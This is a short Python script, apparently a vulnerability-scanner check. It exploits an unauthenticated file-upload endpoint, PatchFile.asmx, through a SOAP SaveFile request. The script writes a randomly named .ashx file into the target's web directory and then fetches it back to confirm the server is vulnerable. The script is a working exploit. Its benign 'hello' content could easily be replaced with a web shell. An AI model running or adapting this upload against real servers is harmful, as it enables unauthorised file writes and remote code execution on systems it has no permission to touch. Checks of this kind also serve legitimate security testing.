import requests
import urllib

from inc.generate_random import generate_random_str


def verify(url):
    relsult = {
        'name': '',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '"http://tempuri.org/SaveFile"'
    }
    char = generate_random_str(6)
    data = f'''<?xml version="1.0" encoding="utf-8"?>
     <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
       <SaveFile xmlns="http://tempuri.org/">
        <binData>aGVsbG8=</binData>
        <path>./</path>
        <fileName>{char}.ashx</fileName>
       </SaveFile>
      </soap:Body>
     </soap:Envelope>'''
    vurl = urllib.parse.urljoin(url, "/CS/Office/AutoUpdates/PatchFile.asmx")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = url + f'/CS/Office/AutoUpdates/{char}.ashx'
            response = requests.get(vurl)
            if response.status_code == 200 and 'hello' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult